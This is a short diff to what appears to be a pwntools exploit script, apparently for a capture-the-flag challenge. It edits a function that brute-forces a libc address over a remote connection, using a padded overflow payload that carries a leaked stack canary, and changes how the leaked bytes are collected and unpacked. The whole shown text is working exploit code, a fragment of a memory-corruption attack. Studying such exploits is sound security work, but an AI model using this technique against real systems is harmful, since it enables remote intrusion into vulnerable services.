@@ -61,7 +61,7 @@ def brute_libc(port):
     guess = 0
     padd = b'B' * 8 * 7
 
-    while (len(leak) < 8):
+    while (len(leak) < 5):
         r = remote(ip, port)
         payload = padd
         payload += p64(canary)
@@ -80,7 +80,7 @@ def brute_libc(port):
             guess += 1
             continue
 
-    leak = u64(leak)
+    leak = u64(leak + b"\x7f\x00\x00")
     return leak
 
 
